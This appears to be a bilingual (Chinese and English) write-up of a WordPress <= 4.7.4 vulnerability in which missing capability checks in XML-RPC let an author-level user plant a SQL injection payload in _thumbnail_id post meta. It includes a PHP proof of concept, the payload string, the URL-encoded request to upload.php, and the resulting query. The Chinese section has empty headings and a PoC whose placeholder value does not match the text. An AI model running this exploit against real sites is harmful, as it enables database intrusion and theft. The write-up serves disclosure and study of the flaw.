Wordpress \<= 4.7.4 XML-RPC API POST META 未校验漏洞
====================================================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 中文版

以作者身份登录到您的wordpress

上传图片

记住图像/媒体的ID

创建帖子并将图像设置为特色图像（这将创建\_thumbnail\_id帖子元）

记住帖子ID

我们可以通过修改\_thumbnail\_id的值来编辑的值（6是帖子ID，5是图片/帖子ID）

### poc

    $usr = 'author';
    $pwd = 'author';
    $xmlrpc = 'http://local.target/xmlrpc.php';
    $client = new IXR_Client($xmlrpc);
    $content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"xxx"));
    $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);

通过这段代码，我们在数据库中添加以下负载

    5 %1$%s hello

执行SQL负载

使用作者帐户登录管理面板，转到媒体，例如

    http://0-sec.org/wp-admin/upload.php

通过\_wpnonce参数可以直接进行sql注入

    http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello

其中5 %1\$%s
hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误）

    SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'

这证明了Wordpress中的sql漏洞，正如5%1\$%s之后的前一个post值中提到的，hello就是我们的payload

### 英文原文

In order to understand the writing here, you need to read the previous
explanation <https://medium.com/websec/wordpress-sqli-bbb2afcc8e94>. If
you got it, then we can jump to the part and solve the question e.g. how
to update / insert our sql payload into \_thumbnail\_id post meta.

#### PoC start

-   Login to your wordpress as author

-   Upload image

-   Remember ID of the image / media

-   Create post and set image as featured image (this creates
    \_thumbnail\_id post meta)

-   Remember the post ID

#### Wordpress ≤ 4.7.4 XML-RPC

n case of appropriate wordpress version then we can use the third
vulnerability in this versions of wordpress
<https://wordpress.org/news/2017/05/wordpress-4-7-5/> e.g.

    Lack of capability checks for post meta data in the XML-RPC API.

This means that we can edit the value of \_thumbnail\_id with the
following code ( 6 is the post ID and 5 is image/post ID )

    $usr = 'author';
    $pwd = 'author';
    $xmlrpc = 'http://local.target/xmlrpc.php';
    $client = new IXR_Client($xmlrpc);
    $content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"5 %1$%s hello"));
    $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);

and with this code we add the following payload in the DB 5 %1\$%s hello

#### Wordpress importer plugin --- any version of wordpress

This is another approach for changing the \_thumbnail\_id value in the
database. If wordpress instance have enabled this plugin on it, then
simple export, change meta value and import will do the job.

#### Execute the SQL payload

Login to the administration panel with your author account, go to media
e.g. <http://local.target/wp-admin/upload.php> , grab the \_wpnonce
value and we are ready to prove our SQLi vulnerability. Issue the
following request towards your local instance:

    local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello

where 5%20%251%24%25s%20hello is url encoded 5 %1\$%s hello. This
request will result with execution of the following query against the DB
(will rise error of course):

    SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'

This proves the SQLi vulnerability in the wordpress and as mention in
previous post value after 5 %1\$%s e.g. hello is our payload

#### Is this vulnerability dangerous?

SQL injection itself is quite dangerous vulnerability, but sometimes
have its own limitations. Here at our case depending of the database
server configuration or mysql client used on PHP side could be fatal,
but in our case best case scenario would be blind sql injection. Sure,
we all know the trivial attack vector, but here we have 2 facts that go
against wordpress:

meta value database column type e.g. size constraint

media parameter could be POST parameter e.g. will have huge size

This two facts guide us to the conclusion that even with blind sqli one
query would be enough to calculate some crucial DB cell value.
